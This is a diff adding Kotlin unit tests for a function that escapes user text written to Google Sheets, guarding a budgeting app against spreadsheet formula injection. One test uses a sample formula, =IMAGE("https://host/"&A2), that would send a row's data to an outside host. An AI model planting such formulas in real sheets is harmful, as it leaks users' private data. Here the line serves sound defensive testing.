@@ -335,4 +335,57 @@ class SheetRowParserTest {
         val fromDevice = BudgetKey("Food", 3, 2026)
         assertTrue(fromDevice in setOf(fromSheet))
     }
+
+    // --- sheetSafeText -----------------------------------------------------------------------
+    // The Transactions and Friends tabs are written USER_ENTERED, so free text the user typed
+    // would otherwise be evaluated as a formula by Google Sheets.
+
+    @Test
+    fun `ordinary text is written unchanged`() {
+        listOf("Groceries", "Rent for March", "Dinner with Arun", "UPI", "").forEach {
+            assertEquals(it, sheetSafeText(it))
+        }
+    }
+
+    @Test
+    fun `a leading equals is escaped`() {
+        assertEquals("'=1+1", sheetSafeText("=1+1"))
+    }
+
+    /** The case that matters in a shared sheet: a formula that calls out to another host. */
+    @Test
+    fun `a formula that would exfiltrate the row is escaped`() {
+        assertEquals(
+            """'=IMAGE("https://host/"&A2)""",
+            sheetSafeText("""=IMAGE("https://host/"&A2)""")
+        )
+    }
+
+    @Test
+    fun `the other formula triggers are escaped`() {
+        assertEquals("'+91 transfer", sheetSafeText("+91 transfer"))
+        assertEquals("'-500 adjustment", sheetSafeText("-500 adjustment"))
+        assertEquals("'@arun", sheetSafeText("@arun"))
+    }
+
+    /**
+     * Written bare, Sheets swallows a leading apostrophe as its own text marker, so a note that
+     * starts with one loses it. Escaping restores the round trip.
+     */
+    @Test
+    fun `a leading apostrophe is preserved by escaping it`() {
+        assertEquals("''tis paid", sheetSafeText("'tis paid"))
+    }
+
+    /** Only the first character decides; an equals sign mid-string is not a formula. */
+    @Test
+    fun `a trigger character later in the string is left alone`() {
+        assertEquals("rent=paid", sheetSafeText("rent=paid"))
+        assertEquals("Arun + Nithin", sheetSafeText("Arun + Nithin"))
+    }
+
+    @Test
+    fun `escaping is not applied twice to an already safe value`() {
+        assertEquals("Food", sheetSafeText(sheetSafeText("Food")))
+    }
 }
